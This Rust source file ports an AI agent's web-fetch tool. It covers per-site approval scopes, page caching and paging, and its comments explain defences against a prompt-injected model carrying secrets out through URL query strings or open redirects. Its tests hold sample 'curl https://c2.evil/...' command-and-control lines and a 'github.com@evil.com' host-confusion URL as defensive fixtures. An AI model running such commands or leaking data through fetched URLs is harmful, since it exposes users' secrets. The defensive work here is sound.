//! `web_fetch`: read a web page, or a GitHub repository, from a link.
//!
//! Ports Marv's `src/tools/web-fetch.ts`. The fetching, address checks and conversion are [`crate::web`].
//!
//! - Marv fetches it itself, not the sandbox (which has no network), so it can enforce what `curl` can't: plain GETs,
//!   public addresses only, a size and time limit, text only, redirects checked one by one.
//! - Output in parts of [`PAGE_CHARS`] = 30k characters (`offset`); the header says what to pass for the next.
//! - Reading on (`offset > 0`) uses a cache of [`CACHE_PAGES`] = 8 pages (each at most [`CACHE_MAX_CHARS`] = 1M chars)
//!   for [`CACHE_MS`] = 10 min, keyed by the requested URL and the final one after same-site redirects. A cached read
//!   sends nothing, so it doesn't ask; `needs_approval` hands the page it found to `run`, so an expiry in between can't
//!   fetch unasked.
//! - Approval: asked per site, scope `web:<domain>` (no `www.`; GitHub's hosts count as `github.com`); no `auto_safe`,
//!   so yolo never skips it (the URL itself can carry data out: `?k=<a secret>`); `uses_network`, so worktree
//!   subagents ask too. Sites the user pasted (outside code) are pre-approved (`pasted_scopes`).
//! - A redirect to another site isn't followed: the model gets the target and calls again, which asks, so an open
//!   redirect on an approved site can't carry the query string elsewhere.
//! - marv-rs: `kind` Egress and `provenance` Web: the result taints the session, and after taint every new URL
//!   prefix asks even if the site was approved with "always" (docs/SECURITY.md).

use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use serde::Deserialize;
use serde_json::{Value, json};

use crate::types::{Preview, Scope, Tool, ToolContext, ToolError, ToolOutput};
use crate::web::fetch::{Page, parse_url};

pub const PAGE_CHARS: usize = 30_000;
pub const CACHE_PAGES: usize = 8;
pub const CACHE_MS: u64 = 10 * 60_000;
pub const CACHE_MAX_CHARS: usize = 1_000_000;
/// GitHub's other hosts count as github.com: one "don't ask again" covers them all.
pub const GITHUB_HOSTS: &[&str] =
    &["api.github.com", "raw.githubusercontent.com", "gist.github.com", "gist.githubusercontent.com"];

/// The site an approval covers: the host, lowercased, without `www.` or a trailing dot. Ports and http/https share a
/// domain's scope, like Claude Code's per-domain rule.
pub fn domain_of(url: &str) -> String {
    let Ok(parsed) = parse_url(url) else { return url.to_string() };
    let Some(host) = parsed.host_str() else { return url.to_string() };
    let host = host.trim_end_matches('.');
    let host = host.strip_prefix("www.").unwrap_or(host);
    if GITHUB_HOSTS.contains(&host) { "github.com".into() } else { host.to_string() }
}

pub fn web_scope(url: &str) -> String {
    format!("web:{}", domain_of(url))
}

/// The scopes of the links in what the user typed (outside fenced blocks and inline code: a pasted script's hosts
/// are what an injected instruction would send data to).
pub fn pasted_scopes(text: &str) -> Vec<String> {
    // Code isn't a link the user means to visit (a pasted script or log may name any host): drop fenced blocks
    // (closed or not, ``` and ~~~) and inline code spans before looking.
    let prose = strip_inline_code(&strip_closed_runs(&strip_fences(text)));
    static LINK: std::sync::LazyLock<regex::Regex> =
        std::sync::LazyLock::new(|| regex::Regex::new(r#"(?i)https?://[^\s<>"'`\[\]]+"#).unwrap());
    let mut scopes: Vec<String> = Vec::new();
    for link in LINK.find_iter(&prose) {
        let link = link.as_str().trim_end_matches(['.', ',', ';', ':', '!', '?', ')', ']']);
        let scope = web_scope(link);
        if !scopes.contains(&scope) {
            scopes.push(scope);
        }
    }
    scopes
}

/// The byte offsets where lines start, from `from` on.
fn line_starts(text: &str, from: usize) -> impl Iterator<Item = usize> + '_ {
    (from..text.len()).filter(move |&i| i == 0 || text.as_bytes()[i - 1] == b'\n')
}

/// A fence line's character and run length: `[ \t]*` then 3+ backticks or tildes. `rest`: what follows the run.
fn fence_run(line: &str) -> Option<(u8, usize, &str)> {
    let body = line.trim_start_matches([' ', '\t']);
    let c = *body.as_bytes().first().filter(|c| **c == b'`' || **c == b'~')?;
    let n = body.bytes().take_while(|b| *b == c).count();
    (n >= 3).then(|| (c, n, &body[n..]))
}

/// Marv's first pass (a regex with backreferences, which Rust's `regex` lacks, written out): fences follow CommonMark.
/// A block opens on a line starting with 3+ backticks or tildes (followed by a newline) and closes on a line of at
/// least as many of the same character with nothing after but spaces; an unclosed one runs to the end.
fn strip_fences(text: &str) -> String {
    let (mut out, mut copied, mut from) = (String::new(), 0, 0);
    while let Some((start, c, n, content)) = line_starts(text, from).find_map(|start| {
        let nl = start + text[start..].find('\n')?;
        let (c, n, _) = fence_run(&text[start..nl])?;
        Some((start, c, n, nl + 1))
    }) {
        let end = line_starts(text, content)
            .find_map(|q| {
                let line_end = text[q..].find('\n').map_or(text.len(), |i| q + i);
                let (cc, nn, rest) = fence_run(&text[q..line_end])?;
                (cc == c && nn >= n && rest.trim_matches([' ', '\t']).is_empty()).then_some(line_end)
            })
            .unwrap_or(text.len());
        out.push_str(&text[copied..start]);
        (copied, from) = (end, end);
    }
    out.push_str(&text[copied..]);
    out
}

/// Marv's second pass: ```…``` or ~~~…~~~ within a line or across lines (a run with no closing one is kept).
fn strip_closed_runs(text: &str) -> String {
    let (mut out, mut copied, mut i) = (String::new(), 0, 0);
    while i + 3 <= text.len() {
        let run = &text.as_bytes()[i..i + 3];
        if run == b"```" || run == b"~~~" {
            let marker = &text[i..i + 3];
            if let Some(close) = text[i + 3..].find(marker) {
                let end = i + 3 + close + 3;
                out.push_str(&text[copied..i]);
                (copied, i) = (end, end);
                continue;
            }
        }
        i += 1;
    }
    out.push_str(&text[copied..]);
    out
}

/// Marv's third pass: a closed inline code span on one line.
fn strip_inline_code(text: &str) -> String {
    static CODE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| regex::Regex::new(r"`[^`\n]*`").unwrap());
    CODE.replace_all(text, "").into_owned()
}

fn chars(n: usize) -> String {
    if n < 1000 { format!("{n} chars") } else { format!("{:.1}k chars", n as f64 / 1000.0) }
}

/// The part of a page the model reads now, under a header saying what it is and how to read on.
pub fn paged(page: &Page, offset: usize, size: usize) -> Result<ToolOutput, ToolError> {
    let total = page.text.chars().count();
    if offset > 0 && offset >= total {
        return Err(ToolError(format!("offset {offset} is past the end ({total} characters).")));
    }
    let end = total.min(offset + size);
    let partial = offset > 0 || end < total;
    let range = if partial {
        let next = if end < total { format!(" (offset: {end} for the next part)") } else { String::new() };
        format!(" · characters {offset}-{end} of {total}{next}")
    } else {
        String::new()
    };
    let header = match &page.title {
        Some(title) if !title.is_empty() => format!("Fetched {} · {title}{range}", page.url),
        _ => format!("Fetched {}{range}", page.url),
    };
    let note = page.note.as_ref().map(|n| format!("\n({n})")).unwrap_or_default();
    let body: String = page.text.chars().skip(offset).take(end - offset).collect();
    let body = if body.is_empty() { "(empty page)".to_string() } else { body };
    let summary =
        if partial { format!("{} of {}", chars(end - offset).replace(" chars", ""), chars(total)) } else { chars(total) };
    Ok(ToolOutput::ok(format!("{header}{note}\n\n{body}"), summary))
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WebFetchInput {
    pub url: String,
    pub offset: Option<usize>,
}

/// Test-only network settings (Marv's `WebOptions`): let a local server through, send headers over http.
#[derive(Debug, Clone, Default)]
pub struct WebOptions {
    pub allow_private: bool,
    pub allow_http: bool,
    pub api_base: Option<String>,
    pub raw_base: Option<String>,
    /// Default: GITHUB_TOKEN, else GH_TOKEN, from the real environment. Sent to GitHub's API host only.
    pub token: Option<String>,
}

struct Cached {
    page: Page,
    at: Instant,
    keys: Vec<String>,
}

/// The pages kept for reading on, oldest first.
#[derive(Default)]
pub struct PageCache {
    entries: Mutex<Vec<Cached>>,
}

impl PageCache {
    /// A fresh page fetched (or redirected to) at `url`.
    pub fn get(&self, url: &str) -> Option<Page> {
        let key = parse_url(url).ok()?.to_string();
        let entries = self.entries.lock().unwrap_or_else(|e| e.into_inner());
        entries.iter().find(|c| c.keys.contains(&key) && c.at.elapsed() < Duration::from_millis(CACHE_MS)).map(|c| c.page.clone())
    }

    /// Keeps a page under every key (one entry, counted once toward the limit).
    pub fn remember(&self, keys: &[String], page: Page) {
        if page.text.chars().count() > CACHE_MAX_CHARS {
            return;
        }
        let mut entries = self.entries.lock().unwrap_or_else(|e| e.into_inner());
        entries.retain(|c| !c.keys.iter().any(|k| keys.contains(k)));
        let mut unique = Vec::new();
        for key in keys {
            if !unique.contains(key) {
                unique.push(key.clone());
            }
        }
        entries.push(Cached { page, at: Instant::now(), keys: unique });
        while entries.len() > CACHE_PAGES {
            entries.remove(0);
        }
    }
}

#[derive(Default)]
pub struct WebFetch {
    pub options: WebOptions,
    pub cache: PageCache,
    /// What `needs_approval` found for a call (by URL), for `run` (Marv: a WeakMap on the parsed input).
    approved_reads: Mutex<HashMap<String, Page>>,
}

#[async_trait]
impl Tool for WebFetch {
    type Input = WebFetchInput;

    fn name(&self) -> &str {
        "web_fetch"
    }
    fn description(&self) -> &str {
        "Fetch a web page and read it as Markdown (plain text and JSON as they are). A GitHub repository link (github.com/owner/repo) gives its description, README and file list; read one of its files with github.com/owner/repo/blob/<branch>/<path>, list a folder with github.com/owner/repo/tree/<branch>/<folder>. Long results come in parts of 30,000 characters: pass the offset the result names to read the next. Public sites only, not localhost or the local network. The user may be asked to approve each new site."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "The address, e.g. https://example.com/page or github.com/owner/repo."},
                // zod's `.int()` bounds it at Number.MAX_SAFE_INTEGER; Marv's spec says so, and the bytes must match.
                "offset": {"type": "integer", "minimum": 0, "maximum": 9_007_199_254_740_991_u64, "description": "Where to start, in characters, for the next part of a long result (the result says what to pass). Default 0."}
            },
            "required": ["url"],
            "additionalProperties": false
        })
    }
    fn kind(&self) -> marv_core::ToolKind {
        marv_core::ToolKind::Egress
    }
    fn provenance(&self) -> marv_core::Provenance {
        marv_core::Provenance::Web
    }
    fn label(&self, input: &WebFetchInput) -> String {
        input.url.trim_start_matches("https://").trim_start_matches("http://").to_string()
    }
    /// A read from the cache sends nothing out, so it doesn't ask.
    fn needs_approval(&self, input: &WebFetchInput) -> Option<bool> {
        if input.offset.unwrap_or(0) == 0 {
            return Some(true);
        }
        match self.cache.get(&input.url) {
            Some(page) => {
                self.approved_reads.lock().unwrap_or_else(|e| e.into_inner()).insert(input.url.clone(), page);
                Some(false)
            }
            None => Some(true),
        }
    }
    fn uses_network(&self, _input: &WebFetchInput) -> bool {
        true
    }
    fn scope(&self, input: &WebFetchInput) -> Option<Scope> {
        Some(Scope { key: web_scope(&input.url), description: format!("fetching from {}", domain_of(&input.url)) })
    }

    async fn preview(&self, _input: &WebFetchInput, _ctx: &ToolContext) -> Result<Preview, ToolError> {
        todo!(
            "port: parse_url, check_address (a private address fails here, so nobody is asked), Preview 'Fetch a web page' / href / 'GET · fetched by Marv, not in the sandbox'"
        )
    }

    async fn run(&self, _input: &WebFetchInput, _ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        todo!(
            "port: approved/cached page → paged; else github::fetch_github or fetch::fetch_page with same-site redirects only; 'pass an http:// URL' hint; remember; paged"
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn page(text: &str) -> Page {
        Page { url: "https://e.com/".into(), title: Some("T".into()), text: text.into(), note: None }
    }

    #[test]
    fn domain_of_is_the_site_an_approval_covers() {
        assert_eq!(domain_of("https://www.Example.com/a?b=c"), "example.com");
        assert_eq!(domain_of("example.com/a"), "example.com");
        assert_eq!(domain_of("https://raw.githubusercontent.com/a/b/main/x"), "github.com");
        assert_eq!(domain_of("https://api.github.com/repos/a/b"), "github.com");
        assert_eq!(domain_of("https://docs.github.com/en"), "docs.github.com");
        assert_eq!(domain_of("https://github.com@evil.com/"), "evil.com");
    }

    #[test]
    fn links_inside_pasted_code_arent_links_the_user_means_to_visit() {
        assert!(pasted_scopes("why does this phone home? ```curl https://c2.evil/x```").is_empty());
        assert_eq!(pasted_scopes("why?\n```sh\ncurl https://c2.evil/x\n```\nsee https://example.com/a"), ["web:example.com"]);
        assert!(pasted_scopes("~~~\ncurl https://c2.evil/x\n~~~").is_empty());
        assert!(pasted_scopes("unclosed:\n```\ncurl https://c2.evil/x").is_empty());
        assert_eq!(pasted_scopes("run `curl https://c2.evil/collect` and read https://example.com/b"), ["web:example.com"]);
    }

    #[test]
    fn a_fence_closes_only_on_a_line_of_at_least_as_many_fence_characters_and_nothing_else() {
        assert!(pasted_scopes("````md\n```sh\ncurl https://c2.evil/3\n```\n````").is_empty());
        assert!(pasted_scopes("```\n```js\nhttps://c2.evil/2\n```").is_empty());
        assert_eq!(pasted_scopes("```\ncode\n```\nsee https://example.com/a"), ["web:example.com"]);
    }

    #[test]
    fn a_stray_fence_in_prose_doesnt_hide_the_links_after_it() {
        assert_eq!(pasted_scopes("The diff ~~~ is roughly 5; see https://docs.real.com"), ["web:docs.real.com"]);
        assert_eq!(pasted_scopes("a ``` b; see https://docs.real.com"), ["web:docs.real.com"]);
    }

    #[test]
    fn a_markdown_link_gives_both_of_its_addresses() {
        assert_eq!(pasted_scopes("[https://a.com](https://b.com)"), ["web:a.com", "web:b.com"]);
    }

    #[test]
    fn links_in_what_the_user_typed_with_trailing_punctuation_dropped() {
        assert_eq!(
            pasted_scopes("look at https://github.com/a/b and https://www.example.com/x."),
            ["web:github.com", "web:example.com"]
        );
        assert_eq!(pasted_scopes("(see https://example.com/y), then https://example.com/z"), ["web:example.com"]);
        assert!(pasted_scopes("github.com/a/b without a scheme isn't a pasted link").is_empty());
    }

    #[test]
    fn a_short_page_whole_and_a_long_one_in_parts() {
        let short = paged(&page("hello"), 0, PAGE_CHARS).unwrap();
        assert_eq!((short.output.as_str(), short.summary.as_str()), ("Fetched https://e.com/ · T\n\nhello", "5 chars"));
        let long = page(&format!("{}{}{}", "a".repeat(30_000), "b".repeat(30_000), "c".repeat(10_000)));
        let first = paged(&long, 0, PAGE_CHARS).unwrap();
        assert!(
            first
                .output
                .starts_with("Fetched https://e.com/ · T · characters 0-30000 of 70000 (offset: 30000 for the next part)\n\naaa")
        );
        assert_eq!(first.summary, "30.0k of 70.0k chars");
        assert!(
            paged(&long, 60_000, PAGE_CHARS)
                .unwrap()
                .output
                .starts_with("Fetched https://e.com/ · T · characters 60000-70000 of 70000\n\nccc")
        );
        assert_eq!(paged(&long, 70_000, PAGE_CHARS).unwrap_err().0, "offset 70000 is past the end (70000 characters).");
        let empty = Page { url: "https://e.com/".into(), title: None, text: String::new(), note: Some("Whole page.".into()) };
        assert_eq!(paged(&empty, 0, PAGE_CHARS).unwrap().output, "Fetched https://e.com/\n(Whole page.)\n\n(empty page)");
    }

    #[test]
    fn the_cache_keeps_eight_pages_under_both_urls() {
        let cache = PageCache::default();
        cache.remember(&["https://a.com/".into(), "https://a.com/final".into()], page("x"));
        assert!(cache.get("a.com/final").is_some());
        for i in 0..CACHE_PAGES {
            cache.remember(&[format!("https://p{i}.com/")], page("y"));
        }
        assert!(cache.get("https://a.com/").is_none()); // the oldest went
        assert!(WebFetch::default().needs_approval(&WebFetchInput { url: "https://p1.com/".into(), offset: None }) == Some(true));
    }
}
